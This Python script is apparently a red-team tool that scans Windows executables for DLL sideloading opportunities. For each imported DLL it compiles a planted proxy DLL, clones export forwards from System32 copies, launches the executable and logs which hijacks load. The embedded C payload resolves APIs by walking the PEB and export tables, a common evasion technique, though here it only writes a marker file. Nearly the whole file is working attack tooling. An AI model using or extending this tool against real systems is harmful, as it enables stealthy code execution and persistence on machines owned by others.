import pefile
import os
import subprocess
import random
import string
import csv
import msvcrt
import sys
import time
import pydemangler
import psutil
import re
import copy

# these binaries will restart, logoff, shutdown, or crash
# rm lsaiso.exe, lsass.exe, logoff.exe, reset.exe, rdpinit.exe, shutdown.exe, wininit.exe

sourceFile = "dllmain.c"
compiler = "g++.exe"
all_working_dlls = []
verbose = False
# timeout = 10

source_code = """#include <processthreadsapi.h>
#include <memoryapi.h>

#define OPEN_ALWAYS 4

typedef HANDLE (WINAPI * CreateFileA_t)( CHAR* lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPVOID lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef WORD(WINAPI * GetModuleFileNameA_t)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);

typedef BOOL (WINAPI * CloseHandle_t)(
HANDLE hObject
);


//https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html#l00063
struct PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
};
//https://processhacker.sourceforge.io/doc/ntpebteb_8h_source.html#l00008
struct PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN SpareBits : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PEB_LDR_DATA* Ldr;
    //...
};

struct UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWCH Buffer;
};
    
//https://processhacker.sourceforge.io/doc/ntldr_8h_source.html#l00102
struct LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    };
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    //...
};

HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName);
FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char * sProcName);



HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName) {

    // get the offset of Process Environment Block
#ifdef _M_IX86 
    PEB * ProcEnvBlk = (PEB *) __readfsdword(0x30);
#else
    PEB * ProcEnvBlk = (PEB *)__readgsqword(0x60);
#endif

    // return base address of a calling module
    if (sModuleName == NULL) 
        return (HMODULE) (ProcEnvBlk->ImageBaseAddress);

    PEB_LDR_DATA * Ldr = ProcEnvBlk->Ldr;
    LIST_ENTRY * ModuleList = NULL;
    
    ModuleList = &Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *  pStartListEntry = ModuleList->Flink;

    for (LIST_ENTRY *  pListEntry  = pStartListEntry;  		// start from beginning of InMemoryOrderModuleList
                    pListEntry != ModuleList;	    	// walk all list entries
                    pListEntry  = pListEntry->Flink)	{
        
        // get current Data Table Entry
        LDR_DATA_TABLE_ENTRY * pEntry = (LDR_DATA_TABLE_ENTRY *) ((BYTE *) pListEntry - sizeof(LIST_ENTRY));

        // check if module is found and return its base address
        if (strcmp((const char *) pEntry->BaseDllName.Buffer, (const char *) sModuleName) == 0)
            return (HMODULE) pEntry->DllBase;
    }

    // otherwise:
    return NULL;

}

FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char * sProcName) {

    char * pBaseAddr = (char *) hMod;

    // get pointers to main headers/structures
    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pBaseAddr;
    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pBaseAddr + pDosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
    IMAGE_DATA_DIRECTORY * pExportDataDir = (IMAGE_DATA_DIRECTORY *) (&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    IMAGE_EXPORT_DIRECTORY * pExportDirAddr = (IMAGE_EXPORT_DIRECTORY *) (pBaseAddr + pExportDataDir->VirtualAddress);

    // resolve addresses to Export Address Table, table of function names and "table of ordinals"
    DWORD * pEAT = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfFunctions);
    DWORD * pFuncNameTbl = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfNames);
    WORD * pHintsTbl = (WORD *) (pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);

    // function address we're looking for
    void *pProcAddr = NULL;

    // resolve function by ordinal
    if (((DWORD_PTR)sProcName >> 16) == 0) {
        WORD ordinal = (WORD) sProcName & 0xFFFF;	// convert to WORD
        DWORD Base = pExportDirAddr->Base;			// first ordinal number

        // check if ordinal is not out of scope
        if (ordinal < Base || ordinal >= Base + pExportDirAddr->NumberOfFunctions)
            return NULL;

        // get the function virtual address = RVA + BaseAddr
        pProcAddr = (FARPROC) (pBaseAddr + (DWORD_PTR) pEAT[ordinal - Base]);
    }
    // resolve function by name
    else {
        // parse through table of function names
        for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
            char * sTmpFuncName = (char *) pBaseAddr + (DWORD_PTR) pFuncNameTbl[i];
    
            if (strcmp(sProcName, sTmpFuncName) == 0)	{
                // found, get the function virtual address = RVA + BaseAddr
                pProcAddr = (FARPROC) (pBaseAddr + (DWORD_PTR) pEAT[pHintsTbl[i]]);
                break;
            }
        }
    }

    return (FARPROC) pProcAddr;
}

INSERT_EXPORTS

void go()
{
        GetModuleFileNameA_t pGetModuleFileNameA = (GetModuleFileNameA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleFileNameA");
        CreateFileA_t pCreateFileA = (CreateFileA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CreateFileA");
        CloseHandle_t pCloseHandle = (CloseHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");
        HANDLE hFile;
        HANDLE hAppend;
        DWORD  dwBytesWritten;
        CHAR szFileName[4096];
        DWORD nameSize;
        // kernel32.GetModuleFileNameA
        pGetModuleFileNameA(NULL, szFileName, MAX_PATH);
        // kernel32.CreateFileA
        hFile = pCreateFileA(
            "working.txt",
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        // msvcrt.strlen
        nameSize = strlen(szFileName);
        // kernel32.CloseHandle
        pCloseHandle(hFile);
        return -1;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    BOOL bReturnValue = TRUE;
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            go();
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return bReturnValue;
}"""

# Read_Only | Initialized_Data
DEFAULT_CHARACTERISTICS = 0x40000040
SECTION_NAME = 8

# Borrowed from https://github.com/monoxgas/Koppeling/blob/master/PyClone/PyClone.py
def align_up(value, align = 0x1000):
    return (value + align - 1) & ~(align - 1)

# Borrowed from https://github.com/monoxgas/Koppeling/blob/master/PyClone/PyClone.py
def add_section(pe, name, size, characteristics = DEFAULT_CHARACTERISTICS):

    # Sanity checks
    
    if len(name) > SECTION_NAME:
        raise Exception('[!] Section name is too long')
    
    section_header_size = pefile.Structure(pefile.PE.__IMAGE_SECTION_HEADER_format__).sizeof()
    section_header_off = pe.sections[-1].get_file_offset() + section_header_size
    if section_header_off + section_header_size > pe.OPTIONAL_HEADER.SizeOfHeaders:
        raise Exception('[!] Not enough room for another SECTION_HEADER')

    # Calculate/Align sizes
    virtual_size = align_up(size, pe.OPTIONAL_HEADER.SectionAlignment)
    virtual_addr = align_up(
        pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize,
        pe.OPTIONAL_HEADER.SectionAlignment
    )

    raw_size = align_up(size, pe.OPTIONAL_HEADER.FileAlignment)
    raw_ptr = align_up(
        pe.sections[-1].PointerToRawData + pe.sections[-1].SizeOfRawData,
        pe.OPTIONAL_HEADER.FileAlignment
    )

    # Configure section properties
    section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__, pe=pe)
    section.set_file_offset(section_header_off)
    section.Name = name.encode().ljust(SECTION_NAME, b'\x00')
    section.VirtualAddress = virtual_addr
    section.PointerToRawData = raw_ptr
    section.Misc = section.Misc_VirtualSize = virtual_size
    section.SizeOfRawData = raw_size
    section.Characteristics = characteristics

    section.PointerToRelocations = 0
    section.NumberOfRelocations = 0
    section.NumberOfLinenumbers = 0
    section.PointerToLinenumbers = 0

    # Correct headers
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = virtual_addr + virtual_size

    # Add buffer padding
    pe.__data__ += b'\x00' * raw_size

    # Append to ensure overwrite
    pe.__structures__.append(section)

    # Recreate to save our changes
    pe = pefile.PE(data = pe.write())

    return pe, section

# Borrowed from https://github.com/monoxgas/Koppeling/blob/master/PyClone/PyClone.py
def _clone_exports(tgt, ref, ref_path, used_exp, new_section_name = '.rdata2'):

    # Forwards don't typically supply the extension
    ref_path = ref_path.replace('.dll', '')

    ref = copy.deepcopy(ref)
    tgt = copy.deepcopy(tgt)

    tgt_export_dir = tgt.OPTIONAL_HEADER.DATA_DIRECTORY[0]
    ref_export_dir = ref.OPTIONAL_HEADER.DATA_DIRECTORY[0]

    if not ref_export_dir.Size:
        raise Exception('Reference binary has no exports')
    
    exp_names = [
        ref_path.encode() + b'.' + e.name 
        if e.name else ref_path.encode() + b'.#' + str(e.ordinal).encode()
        for e in sorted(ref.DIRECTORY_ENTRY_EXPORT.symbols, key=lambda x: x.ordinal)
    ]

    used_exp_names = []
    for i in used_exp:
        if any(i in s for s in exp_names):
            # print(f"    |_ {i} found in reference DLL")
            used_exp_names.append(i)
    
    exp_names_blob = b'\x00'.join(used_exp_names) + b'\x00'

    new_section_size = ref_export_dir.Size + len(exp_names_blob)

    tgt, section = add_section(tgt, new_section_name, new_section_size)
    final_rva = section.VirtualAddress

    # Capture the reference export directory
    export_dir = ref.__unpack_data__(
        pefile.PE.__IMAGE_EXPORT_DIRECTORY_format__,
        ref.get_data(
            ref_export_dir.VirtualAddress,
            pefile.Structure(pefile.PE.__IMAGE_EXPORT_DIRECTORY_format__).sizeof()
        ),
        file_offset = 0 # we don't need this
    )

    # Calculate our delta
    delta = final_rva - ref_export_dir.VirtualAddress

    # Apply RVA delta to export names
    for i in range(export_dir.NumberOfNames):
        ref.set_dword_at_rva(
            export_dir.AddressOfNames + 4*i,
            ref.get_dword_at_rva(export_dir.AddressOfNames + 4*i) + delta
        )

    # Link function addresses to forward names
    forward_offset = ref_export_dir.VirtualAddress + ref_export_dir.Size + delta
    true_offset = 0

    for i in range(export_dir.NumberOfFunctions):

        if not ref.get_dword_at_rva(export_dir.AddressOfFunctions + 4*i):
            continue # This function is hollow (never used)

        forward_name = exp_names[true_offset]
        ref.set_dword_at_rva(
            export_dir.AddressOfFunctions + 4*i,
            forward_offset
        )
        forward_offset += len(forward_name) + 1 # +1 for null byte
        true_offset += 1

    # Apply RVA delta to directory
    export_dir.AddressOfFunctions += delta
    export_dir.AddressOfNames += delta
    export_dir.AddressOfNameOrdinals += delta

    # Write in our new export directory
    tgt.set_bytes_at_rva(
        final_rva, 
        ref.get_data(ref_export_dir.VirtualAddress, ref_export_dir.Size) + exp_names_blob
    )
    tgt.set_bytes_at_rva(
        final_rva, 
        export_dir.__pack__()
    )

    # Rebuild from bytes to save back
    tgt = pefile.PE(data = tgt.__data__)

    # Update directory specs
    tgt_export_dir = tgt.OPTIONAL_HEADER.DATA_DIRECTORY[0]
    tgt_export_dir.VirtualAddress = section.VirtualAddress
    tgt_export_dir.Size = new_section_size
    tgt = pefile.PE(data = tgt.write())

    return tgt

def randomString(length=-1):
    """
    Returns a random string of "length" characters.
    If no length is specified, resulting string is in
    between 6 and 15 characters.
    Borrowed from https://github.com/GreatSCT/GreatSCT/blob/master/Tools/Bypass/bypass_common/bypass_helpers.py#L123
    """
    # Check if the length is -1
    if length == -1:
        # If the length is -1, generate a random string between 6 and 15 characters
        length = random.randrange(6, 16)
    # Generate the random string with the desired length
    random_string = ''.join(random.choice(string.ascii_letters) for x in range(length))
    
    return random_string

def genExport(export):

    result = ""
    ordinal_result = ""
    dllProxy_result = []

    code = """extern "C" 
{
     __declspec(dllexport) int placeholder()
    {
        return 0;
    }
}"""
    ordinal = False
    dllProxy = False

    for imp in export:
        if imp.name is not None:
            if pydemangler.demangle(imp.name.decode('utf-8')) is None:
                tmp = code
                tmp = tmp.replace("placeholder", imp.name.decode('utf-8'))
                result += tmp
            else:
                dllProxy = True
                dllProxy_result.append(imp.name)
            
        else:
            ordinal = True
            tmp = code
            random_name = randomString(length=4)
            tmp = tmp.replace("placeholder", random_name)
            result += tmp
            ordinal_result += (f"    {random_name} @{imp.ordinal} NONAME\n")

    if ordinal:
        with open("testaroo.def", "w") as f:
            f.write("EXPORTS\n")
            f.write(ordinal_result)

    if dllProxy:
        result = dllProxy_result

    return result, ordinal, dllProxy

cwd = os.listdir(".")

with open('results.csv', 'w', newline='') as f:
    header = ["Executable", "DllName"]
    writer = csv.writer(f)
    writer.writerow(header)

for file in cwd:
    if file.endswith(".exe"):
        exe_path = file
        pe = pefile.PE(exe_path)
        pe.parse_data_directories()
        dlls_of_interest = []
        csv_result = []
        blacklist = ["KERNEL32", "NTDLL", "ADVAPI32", "GDIPLUS", "USER32", "WIATRACE", "API-MS", "OLE32", "OLEAUT32", "EXT-MS-WIN", "KERNELBASE", "GDI32", "COMCTL32", "MSVCRT", "RPCRT4", "COMDLG32", "SHELL32", "SHLWAPI", "CRYPT32"]
        # blacklist = []

        try:
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                testaroo = entry.dll.decode('utf-8').upper()
                if any(blocked in testaroo for blocked in blacklist):
                    pass
                else:
                    dlls_of_interest.append(entry)

            if verbose:
                print("[*] Listing imported DLLs...")
                for i in dlls_of_interest:
                    print("    |_ ", i.dll.decode('utf-8'))
                    for imp in i.imports:
                        if imp.name is not None:
                            if pydemangler.demangle(imp.name.decode('utf-8')) is None:
                                print('    |_ ', imp.name.decode('utf-8'))
                            else:
                                print('    |_ ', imp.name.decode('utf-8'))
                            
                        else:
                            print('    ', imp.ordinal)

            for i in dlls_of_interest:
                print(f"[*] Creating a payload for {exe_path} with {i.dll.decode('utf-8')}")
                working_dlls = []
                temp_source_code = source_code
                export, ordinal, dllProxy = genExport(i.imports)
                if dllProxy:
                    temp_source_code = temp_source_code.replace("INSERT_EXPORTS", "")
                    temp_source_code = temp_source_code.replace("working.txt", f"{exe_path}_{i.dll.decode('utf-8')}.txt")
                else:
                    temp_source_code = temp_source_code.replace("INSERT_EXPORTS", export)
                    temp_source_code = temp_source_code.replace("working.txt", f"{exe_path}_{i.dll.decode('utf-8')}.txt")

                with open(sourceFile, "w") as f:
                    f.write(temp_source_code)
                
                fileName = i.dll.decode('utf-8')
                
                try:
                    if ordinal:
                        compiler_args = [compiler, "-s", "-Os", "-static", "-shared", "-fpermissive", "testaroo.def", f"-o{fileName}", f"{sourceFile}"]
                    else:
                        compiler_args = [compiler, "-s", "-Os", "-static", "-shared", "-fpermissive", f"-o{fileName}", f"{sourceFile}"]

                    print("    |_ Compiling with: " + " ".join(compiler_args))
                    subprocess.check_call(compiler_args, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

                    if dllProxy:
                        reference = f"C:\\Windows\System32\\{fileName}"
                        if os.path.exists(fileName) and os.path.exists(reference):
                            target_data = open(fileName, "rb").read()
                            reference_data = open(reference, "rb").read()
                            target_pe = pefile.PE(data=target_data)
                            reference_pe = pefile.PE(data=reference_data)
                            print(f"    |_ Be patient, cloning exports from {reference} to {fileName}")
                            cloned_pe = _clone_exports(target_pe, reference_pe, reference, export, ".rdata2")
                            cloned_bytes = cloned_pe.write()
                            open(f"{fileName}", "wb").write(cloned_bytes)
                            

                except Exception as e:
                    print(f"    |_ Error: {e}")
       
                try:
                    print(f"    |_ Testing {exe_path} with {fileName} for DLL sideloading opportunity")
                    subp = subprocess.Popen([f".\{exe_path}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    TIMEOUT = 5

                    p = psutil.Process(subp.pid)
                    print(f"    |_ PID: {p.pid}")
                    import signal
                    while 1:
                        if p.is_running():
                            
                            if (time.time() - p.create_time()) > TIMEOUT:
                                p.kill()
                                for proc in psutil.process_iter():
                                    if proc.name() == exe_path or proc.name() == "WerFault.exe":
                                        print(f"    |_ Process Name: {proc.name()}")
                                        proc.kill()
                                break
                        else:
                            break
                except Exception as e:
                    print(f"    |_ Error: {e}")
                try:
                    if os.path.exists(fileName):
                        os.remove(fileName)
                        # pass
                except Exception as e:
                    print(f"    |_ Error: {e}")

                test = os.listdir()
                if f"{exe_path}_{i.dll.decode('utf-8')}.txt" in test:
                    working_dlls.append(f"{exe_path}")
                    working_dlls.append(f"{i.dll.decode('utf-8')}")
                    all_working_dlls.append(working_dlls)
                    csv_result.append(working_dlls)
        except Exception as e:
            print(f"    |_ Error: {e}")

        if len(csv_result) > 0:
            with open('results.csv', 'a', newline='') as f:
                print(f"[>] Listing working DLL sideloads")
                writer = csv.writer(f)
                for i in csv_result:
                    print(f"    |_ {' '.join(i)}")
                    writer.writerow(i)

with open('results2.csv', 'w', newline='') as f:
    header = ["Executable", "DllName"]
    writer = csv.writer(f)
    writer.writerow(header)
    for i in all_working_dlls:
        writer.writerow(i)
